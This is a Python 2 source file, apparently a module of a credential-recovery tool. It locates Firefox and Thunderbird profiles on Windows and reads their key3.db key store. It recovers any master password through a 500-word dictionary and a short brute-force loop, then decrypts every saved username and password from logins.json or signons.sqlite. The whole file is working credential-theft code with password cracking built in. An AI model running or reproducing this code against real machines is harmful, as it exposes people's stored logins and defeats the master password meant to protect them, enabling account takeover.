#!/usr/bin/env python
# Required files (key3.db, signongs.sqlite, cert8.db)
# Inspired from https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py

from ctypes import *
import sys, os, re, glob
from base64 import b64decode
from ConfigParser import RawConfigParser
import sqlite3
import json
import shutil
from dico import get_dico
from itertools import product
#https://pypi.python.org/pypi/pyasn1/
from pyasn1.codec.der import decoder
from struct import unpack
from binascii import hexlify, unhexlify
from hashlib import sha1
import hmac
from Crypto.Util.number import long_to_bytes 
from Crypto.Cipher import DES3

# Database classes
database_find = False
class Credentials(object):
	def __init__(self, db):
		global database_find
		self.db = db
		if os.path.isfile(db):
			# check if the database is not empty
			f = open(db, 'r')
			tmp = f.read()
			if tmp:
				database_find = True
			f.close()
	
	def __iter__(self):
		pass
	
	def done(self):
		pass

class JsonDatabase(Credentials):
	def __init__(self, profile):
		db = profile + os.sep + "logins.json"
		super(JsonDatabase, self).__init__(db)
	
	def __iter__(self):
		if os.path.exists(self.db):
			with open(self.db) as fh:
				data = json.load(fh)
				try:
					logins = data["logins"]
				except:
					raise Exception("Unrecognized format in {0}".format(self.db))
				
				for i in logins:
					yield (i["hostname"], i["encryptedUsername"],	i["encryptedPassword"])

class SqliteDatabase(Credentials):
	def __init__(self, profile):
		db = profile + os.sep + "signons.sqlite"
		super(SqliteDatabase, self).__init__(db)
		self.conn = sqlite3.connect(db)
		self.c = self.conn.cursor()
	
	def __iter__(self):
		self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
		for i in self.c:
			yield i
	
	def done(self):
		super(SqliteDatabase, self).done()
		self.c.close()
		self.conn.close()


class Mozilla():
	# b = brute force attack
	# m = manually
	# d = default list
	# a = dictionary attack

	def __init__(self, isThunderbird = False):
		
		self.credentials_categorie = None	

		self.toCheck = []
		self.manually_pass = None
		self.dictionary_path = None
		self.number_toStop = None

		self.key3 = ''
	
	def get_path(self, software_name):
		
		path = ''
		if 'APPDATA' in os.environ:
			if software_name == 'Firefox':
				path =  '%s\Mozilla\Firefox' % str(os.environ['APPDATA'])
			elif software_name == 'Thunderbird':
				path = '%s\Thunderbird' % str(os.environ['APPDATA'])

		return path
	
	def manage_advanced_options(self):
		# default attack
		if self.toCheck == []:
			self.toCheck = ['b', 'd']
			self.number_toStop = 3

	# --------------------------------------------

	def getShortLE(self, d, a):
		return unpack('<H',(d)[a:a+2])[0]

	def getLongBE(self, d, a):
		return unpack('>L',(d)[a:a+4])[0]

	def printASN1(self, d, l, rl):
		type = ord(d[0])
		length = ord(d[1])
		if length&0x80 > 0: #http://luca.ntop.org/Teaching/Appunti/asn1.html,
			nByteLength = length&0x7f
			length = ord(d[2])  
			#Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets. 
			skip=1
		else:
			skip=0    

		if type==0x30:
			seqLen = length
			readLen = 0
			while seqLen>0:
				len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
				seqLen = seqLen - len2
				readLen = readLen + len2
			return length+2
		elif type==6: #OID
			return length+2
		elif type==4: #OCTETSTRING
			return length+2
		elif type==5: #NULL
			# print 0
			return length+2
		elif type==2: #INTEGER
			return length+2
		else:
			if length==l-2:
				self.printASN1( d[2:], length, rl+1)
				return length   

	#extract records from a BSD DB 1.85, hash mode       
	def readBsddb(self, name):   
		f = open(name,'rb')
		
		#http://download.oracle.com/berkeley-db/db.1.85.tar.gz
		header = f.read(4*15)
		magic = self.getLongBE(header,0)
		if magic != 0x61561:
			return False
		version = self.getLongBE(header,4)
		if version !=2:
			return False
		pagesize = self.getLongBE(header,12)
		nkeys = self.getLongBE(header,0x38) 

		readkeys = 0
		page = 1
		nval = 0
		val = 1
		db1 = []
		while (readkeys < nkeys):
			f.seek(pagesize*page)
			offsets = f.read((nkeys+1)* 4 +2)
			offsetVals = []
			i=0
			nval = 0
			val = 1
			keys = 0
			while nval != val :
				keys +=1
				key = self.getShortLE(offsets,2+i)
				val = self.getShortLE(offsets,4+i)
				nval = self.getShortLE(offsets,8+i)
				offsetVals.append(key+ pagesize*page)
				offsetVals.append(val+ pagesize*page)  
				readkeys += 1
				i += 4
			offsetVals.append(pagesize*(page+1))
			valKey = sorted(offsetVals)  
			for i in range( keys*2 ):
				f.seek(valKey[i])
				data = f.read(valKey[i+1] - valKey[i])
				db1.append(data)
			page += 1
		f.close()
		db = {}

		for i in range( 0, len(db1), 2):
			db[ db1[i+1] ] = db1[ i ]

		return db  

	def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData ):
		#see http://www.drh-consultancy.demon.co.uk/key3.html
		hp = sha1( globalSalt+masterPassword ).digest()
		pes = entrySalt + '\x00'*(20-len(entrySalt))
		chp = sha1( hp+entrySalt ).digest()
		k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
		tk = hmac.new(chp, pes, sha1).digest()
		k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
		k = k1+k2
		iv = k[-8:]
		key = k[:24]

		return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)

	def extractSecretKey(self, globalSalt, masterPassword, entrySalt):

		(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)
		
		if unhexlify('f8000000000000000000000000000001') not in self.key3:
			return None
		privKeyEntry = self.key3[ unhexlify('f8000000000000000000000000000001') ]
		saltLen = ord( privKeyEntry[1] )
		nameLen = ord( privKeyEntry[2] )
		privKeyEntryASN1 = decoder.decode( privKeyEntry[3+saltLen+nameLen:] )
		data = privKeyEntry[3+saltLen+nameLen:]
		self.printASN1(data, len(data), 0)
		
		#see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
		entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
		privKeyData = privKeyEntryASN1[0][1].asOctets()
		privKey = self.decrypt3DES( globalSalt, masterPassword, entrySalt, privKeyData )
		self.printASN1(privKey, len(privKey), 0)

		privKeyASN1 = decoder.decode( privKey )
		prKey= privKeyASN1[0][2].asOctets()
		self.printASN1(prKey, len(prKey), 0)
		prKeyASN1 = decoder.decode( prKey )
		id = prKeyASN1[0][1]
		key = long_to_bytes( prKeyASN1[0][3] )

		return key

	# --------------------------------------------
	
	# Get the path list of the firefox profiles
	def get_firefox_profiles(self, directory):
		cp = RawConfigParser()
		cp.read(os.path.join(directory, 'profiles.ini'))
		profile_list = []
		for section in cp.sections():
			if section.startswith('Profile'):
				if cp.has_option(section, 'Path'):
					profile_list.append(os.path.join(directory, cp.get(section, 'Path').strip()))
		return profile_list
	
	# ------------------------------ Master Password Functions ------------------------------
	
	def is_masterpassword_correct(self, masterPassword=''):
		try:
			#see http://www.drh-consultancy.demon.co.uk/key3.html
			pwdCheck = self.key3['password-check']	
			entrySaltLen = ord(pwdCheck[1])
			entrySalt = pwdCheck[3: 3+entrySaltLen]
			encryptedPasswd = pwdCheck[-16:]
			globalSalt = self.key3['global-salt']
			cleartextData = self.decrypt3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )
			if cleartextData != 'password-check\x02\x02':
				return ('', '', '')

			return (globalSalt, masterPassword, entrySalt)
		except:
			return ('', '', '')
	
	# Retrieve masterpassword
	def found_masterpassword(self):
				
		# 500 most used passwords
		if 'd' in self.toCheck:
			wordlist = get_dico()
			num_lines = (len(wordlist)-1)

			for word in wordlist:
				if self.is_masterpassword_correct(word)[0]:
					return word
		
		# brute force attack
		if 'b' in self.toCheck:
			charset_list = 'abcdefghijklmnopqrstuvwxyz1234567890!?'
			try:
				for length in range(1, int(self.number_toStop)):
					words = product(charset_list, repeat=length)
					for word in words:
						if self.is_masterpassword_correct(''.join(word))[0]:
							w = ''.join(word)
							return w.strip()
			except (KeyboardInterrupt, SystemExit):
				print 'INTERRUPTED!'
			except Exception,e:
				pass
		return False

	# ------------------------------ End of Master Password Functions ------------------------------
	
	# main function
	def run(self, mozilla_software):
		global database_find
		database_find = False

		self.manage_advanced_options()
		
		software_name = mozilla_software
		
		# get the installation path
		path = self.get_path(software_name)
		if not path:
			return
		
		#Check if mozilla folder has been found
		elif not os.path.exists(path):
			return
		else:
			profile_list = self.get_firefox_profiles(path)

			pwdFound = []
			for profile in profile_list:
				if not os.path.exists(profile + os.sep + 'key3.db'):
					return

				self.key3 = self.readBsddb(profile + os.sep + 'key3.db')
				if not self.key3:
					return

				# check if passwords are stored on the Json format
				try:
					credentials = JsonDatabase(profile)
				except:
					database_find = False

				if not database_find:
					# check if passwords are stored on the sqlite format
					try:
						credentials = SqliteDatabase(profile)
					except:
						database_find = False
				
				if database_find:
					masterPassword = ''
					(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)
					
					# find masterpassword if set
					if not globalSalt:
						masterPassword = self.found_masterpassword()
						if not masterPassword:
							return 
					
					# get user secret key
					key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)
					if not key:
						return 

					# everything is ready to decrypt password
					for host, user, passw in credentials:
						values = {}
						values["Website"] = host
						values["Category"] = '%s' % software_name

						# Login	
						loginASN1 = decoder.decode(b64decode(user))
						iv = loginASN1[0][1][1].asOctets()
						ciphertext = loginASN1[0][2].asOctets()
						login = DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
						# remove bad character at the end
						try:
							nb = unpack('B', login[-1])[0]
							values["Username"] = login[:-nb]
						except:
							values["Username"] = login
						
						# Password
						passwdASN1 = decoder.decode(b64decode(passw))
						iv = passwdASN1[0][1][1].asOctets()
						ciphertext = passwdASN1[0][2].asOctets()
						password = DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
						# remove bad character at the end
						try:
							nb = unpack('B', password[-1])[0]
							values["Password"] =  password[:-nb]
						except:
							values["Password"] =  password


						if len(values):
							pwdFound.append(values)

			return pwdFound

